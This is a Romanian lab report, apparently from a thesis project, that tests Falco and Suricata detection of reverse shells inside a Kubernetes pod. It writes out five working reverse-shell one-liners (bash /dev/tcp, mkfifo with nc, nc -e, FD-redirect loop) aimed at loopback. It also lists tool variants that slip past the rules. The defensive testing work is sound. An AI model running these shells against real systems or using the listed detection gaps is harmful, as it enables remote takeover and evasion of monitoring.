# Scenariul 3 — Reverse Shell

**MITRE ATT&CK:** T1059 (Command and Scripting Interpreter) — sub-technique T1059.004 (Unix Shell)

## Pași de atac

1. `nc -lnvp 4444` — netcat listener (bind shell pattern, baseline)
2. `bash -i >& /dev/tcp/127.0.0.1/4444 0>&1` — reverse shell clasic via builtin Bash `/dev/tcp` (fără binar extern)
3. `mkfifo /tmp/rsf && cat /tmp/rsf | bash -i 2>&1 | nc 127.0.0.1 4445 > /tmp/rsf` — variant FIFO (named pipe)
4. `nc -e /bin/sh 127.0.0.1 4446` — pattern `nc -e` (executat eșuează pe OpenBSD nc, dar **cmdline**-ul declanșează regulile)
5. `exec 5<>/dev/tcp/127.0.0.1/4447; cat <&5 | while read l; do $l 2>&5 >&5; done` — variant cu redirect pe FD numerotat

## Rezultate finale (baseline, 0 iterații de tuning)

| Regulă | Tip | Priority | Count |
|---|---|---|---|
| `K8S_THREAT: Reverse Shell - Command Pattern in Container` | custom | Critical | 9 |
| `Drop and execute new binary in container` | default | Critical | 5 |
| `K8S_THREAT: Network Scanning Tool in Container` | custom | Warning | 5 |
| `K8S_THREAT: Data Exfiltration - Transfer Tool in Container` | custom | Warning | 5 |
| `Redirect STDOUT/STDIN to Network Connection in Container` | default | Notice | 4 |
| `K8S_THREAT: Netcat Listener in Container` | custom | Warning | 3 |
| `Netcat Remote Code Execution in Container` | default | Warning | 1 |
| **Total** | | | **32** |

**Detection rate**: 100% (toate cele 5 variante de atac detectate prin reguli multiple)
**False positive rate**: 0%
**Iterații de tuning necesare**: 0 — regulile existente (custom + default) acoperă complet TTP-ul.

## Mapare detecții pe pași de atac

| Step | t (rel) | Rule overlap |
|---|---|---|
| 1: nc -lnvp 4444 | +2s | Netcat Listener + Network Scanning + Data Exfil + Drop&Execute (4) |
| 2: bash /dev/tcp | +5s | Reverse Shell Pattern ×3 + Redirect STDOUT/STDIN ×3 (6) |
| 3a: nc -lnvp 4445 | +10s | identic cu step 1 (4) |
| 3b: mkfifo+bash+nc | +13s | Reverse Shell Pattern ×3 + Network Scanning + Data Exfil + Drop&Execute (6) |
| 4: nc -e attempt | +16s | Reverse Shell Pattern + **Netcat Remote Code Execution** + Network Scanning + Data Exfil + Drop&Execute (5) |
| 5a: nc -lnvp 4447 | +20s | identic cu step 1 (4) |
| 5b: exec FD redirect | +25s | Reverse Shell Pattern ×2 + Redirect STDOUT/STDIN (3) |

## Re-validare pe helm rev 22 (2026-05-11)

Re-rulat după migrarea la `collectors.containerEngine` (metadata k8s populată) + macro `not_system_namespace` upgradeat — **33 detecții** (vs 32 în runul original). Diferența +1: a apărut **`K8S_THREAT: Crypto Mining Pool Connection` (1 hit)** — reverse shell-ul de la pasul 2 se conectează la `127.0.0.1:4444`, iar **portul 4444 este în lista `crypto_mining_ports`** (3333, 4444, 5555, 7777, 8888, 9999, 14433, 14444, 45700). Înainte de rev 21 această regulă nu se declanșa pentru s03 pentru că `container.id` nu se popula consistent pe evenimentele de rețea (același mecanism care bloca și `DNS Exfiltration Suspicion` la s07) — odată reparat enrichment-ul, regula trage și aici.

**Evaluare**: e o **atribuire greșită** (un reverse shell pe :4444 nu e crypto mining), dar alerta nu e complet falsă — "conexiune la portul 4444 dintr-un container" e suspectă indiferent de cauză (4444 = port-ul default Metasploit pentru reverse shell ȘI port folosit de unele config-uri de mining). Limitare clasică a euristicilor port-based: detectează "conexiune la port suspect", nu "crypto mining" specific. **Fix aplicat (helm rev 24, 2026-05-11)**: scos portul 4444 din lista `crypto_mining_ports` — covârșitor asociat cu reverse shell-uri, nu cu pool-uri de mining; nu se pierde coverage la scenariul 2 (mining-ul folosește 3333/5555/7777/14444/45700). Re-rulat pe rev 24: `Crypto Mining Pool Connection` **nu mai apare**.

Output-urile au acum `image=docker.io/library/ubuntu k8s_ns=attack-target k8s_pod=attack-pod` (+ `container_image_tag=22.04`). _Caveat: `container_name` apare uneori ca ID-ul de container (`6727f8a36212`) în loc de numele k8s (`attacker`) — inconsistență a plugin-ului `container@0.6.3` când engine-urile `cri` și `containerd` sunt ambele active pe același socket; `k8s.ns.name`/`k8s.pod.name`/`image` rămân stabile, care sunt câmpurile relevante pentru corelație. Candidat de rafinare: păstrarea doar a engine-ului `cri`._

_Caveat de reproducibilitate: numărul total variază 29–33 între rulări — cele 3 listenere `nc -lnvp` sunt pornite în background printr-un `kubectl exec ... -- bash -c "... &"`, iar shell-ul iese imediat → uneori procesul backgrounded primește SIGHUP înainte de a face exec pe nc. Detecțiile de bază (`Reverse Shell - Command Pattern` ×9, `Redirect STDOUT/STDIN` ×4) sunt stabile; doar count-urile "bonus" (Netcat Listener / Network Scanning / Drop&Execute pe listenere) fluctuează. Fix posibil: `nohup`/`setsid` pe listenere._

## Discoveries (relevant pentru Cap D și Cap 6)

### 1. Regulă custom `Shell with Network FD` nu se declanșează — defect de design

Regula `K8S_THREAT: Reverse Shell - Shell with Network FD` din custom-values.yaml a fost scrisă cu condiția:
```yaml
spawned_process and proc.name in (bash, sh, ...) and fd.type in (ipv4, ipv6) and proc.tty = 0
```
**N-a tras niciodată.** Cauza: `spawned_process` filtrează `evt.type = execve`, iar la momentul `execve`, câmpul `fd.type` nu reflectă FD-urile moștenite ca socket-uri. Falco populează `fd.*` doar pentru syscall-uri care iau un FD ca parametru (read, write, dup2, sendto etc.).

În schimb, regula default Falco `Redirect STDOUT/STDIN to Network Connection in Container` **a acoperit perfect cazul** (4 hits pe step 2 + step 5b). Aceasta folosește un trigger pe `dup2/dup3` syscall, care se evaluează exact când STDOUT/STDIN este redirectat către socket-ul de rețea.

**Lecție pentru Cap D**: regulile custom care folosesc câmpuri context-dependente (`fd.*`) trebuie să selecteze evenimentul potrivit — `execve` nu este momentul potrivit pentru a verifica FD-uri. **Decizie**: păstrăm regula custom dar documentăm limitarea; default-ul Falco acoperă cazul real. Alternativ, ar putea fi rescrisă pe `evt.type = dup2 or evt.type = dup3` pentru a deveni funcțională.

### 2. Detectie pe `intentie` vs `succes` — pattern `nc -e` pe OpenBSD netcat

Pasul 4 (`nc -e /bin/sh ...`) a eșuat la runtime — OpenBSD nc (default Ubuntu 22.04) nu suportă opțiunea `-e`. Output: `nc: invalid option -- 'e'`.

**Falco a detectat oricum**: `Netcat Remote Code Execution in Container` (default) + `Reverse Shell - Command Pattern` (custom) au tras pentru că `execve` se loghează *înainte* ca nc să parseze flag-urile și să iasă cu eroare. Detecția syscall-based vede *intenția* atacantorului (cmdline + invocare binar), nu *succesul*.

**Implicație practică**: un atacator care încearcă o variantă incompatibilă cu binarul prezent nu scapă de detecție — deja a generat zgomot suficient pentru ca un blue team să răspundă.

### 3. Cross-rule coverage prin `rule_matching: all` — confirmare empirică

Pasul 2 (un singur reverse shell) a declanșat **6 detecții** distincte:
- 3× `K8S_THREAT: Reverse Shell - Command Pattern` (outer bash + middle bash + inner bash, fiecare cu cmdline care conține `/dev/tcp` sau `bash -i`)
- 3× `Redirect STDOUT/STDIN to Network Connection` (la fiecare dup2 pe FD-ul socket)

Pasul 1 (un simplu `nc -lnvp`) a declanșat **4 detecții** prin reguli din scenarii diferite (Netcat Listener din scenariul 3, Network Scanning din scenariul 5, Data Exfiltration din scenariul 7, Drop and execute new binary default).

**Acesta este efectul lui `rule_matching: all`** — defense-in-depth real, multiple layere de detecție pe același eveniment. Cu `rule_matching: first` (default Falco), 5-6 din aceste 32 detecții ar fi fost suprimate silent.

### 4. Coverage cross-scenario natural — `nc` declanșează 3 reguli din scenarii distincte

`nc` ca binar atinge concomitent:
- Scenariul 3 (Netcat Listener / Reverse Shell)
- Scenariul 5 (Network Scanning Tool)
- Scenariul 7 (Data Exfiltration Transfer Tool)

Aceasta nu este FP — toate 3 categorizări sunt corecte semantic pentru `nc`. **Observație Cap E**: un binar cu utilități multiple (curl, wget, nc) va declanșa rule-overlap cross-scenario, ceea ce este *dorit* pentru threat hunting cuprinzător.

### 5. Default rules complementare — context post-installation

`Drop and execute new binary in container` a tras 5× pe nc (un hit per invocare nouă). Cauza, ca în scenariul 6: `nc` a fost instalat post-startup container, deci ctime-ul binarului e mai recent decât pornirea containerului. Aceasta este o regulă **comportamentală** care nu depinde de cmdline pattern și ar prinde inclusiv un binar custom rebadge-at ca `nc` (păstrând signature-ul comportamental).

## Suricata
**N/A confirmat empiric.** În fereastra de atac (18:50:00–18:51:00 UTC), Suricata a generat 13 alerte, dar toate au fost:
- Severity 3 (info-level)
- TCP stream anomalies (`SURICATA STREAM 3way handshake wrong seq`, `Packet with invalid timestamp`, `CLOSEWAIT FIN out of window`)
- Pe traseul `10.1.247.24 → 10.1.217.70` — pod-uri nelegate de attack-pod (10.1.217.86)

**Concluzie**: traficul pe `127.0.0.1` (loopback) NU traversează interfața monitorizată de Suricata. Pentru detecție Suricata reală a reverse shell ar fi nevoie de:
- Comunicație pod-to-pod (CNI bridge)
- Sau pod-to-extern

Aceasta este o **limitare structurală** documentată pentru Cap 6 — Falco (kernel-level) și Suricata (network-level) sunt complementare, dar Suricata are blind spot pentru reverse shell-uri intra-process / loopback.

## Cross-tool correlation
**Scăzut prin design.** Acest scenariu confirmă coverage Falco standalone pentru reverse shell. Pentru a demonstra cross-tool, scenariul 7 (Data Exfiltration spre extern) și scenariul 5 (Network Scanning) sunt mai potrivite.

## False negatives potențiale (de monitorizat în extensii viitoare)

- `socat TCP4-LISTEN:port,fork EXEC:/bin/bash` — socat NU e în lista `network_scanning_tools`. Necesită extensie regulă custom dacă atacatorul îl instalează.
- Reverse shell prin `python -c`, `perl -e`, `ruby -rsocket`, `php -r` cu socket — regula curentă acoperă doar `python` + `connect`. Limbajele dinamice via interpretor inline pot scăpa dacă cuvântul `connect` lipsește din cmdline.
- Reverse shell encrypted (ex: `socat OPENSSL`, SSH tunnel) — Falco prinde execve, dar pattern-urile diferă; regulă separată necesară.
- Encoded payloads (base64 → decode → exec) — `.decode(` listat ca pattern, dar variante non-Python (ex: `bash <(base64 -d ...)`) pot scăpa.

## Comanda de rulare

```bash
cd /home/tionu/Proiect_licenta/k8s-threat-detection-system/attack-scenarios/03-reverse-shell
./attack.sh
```
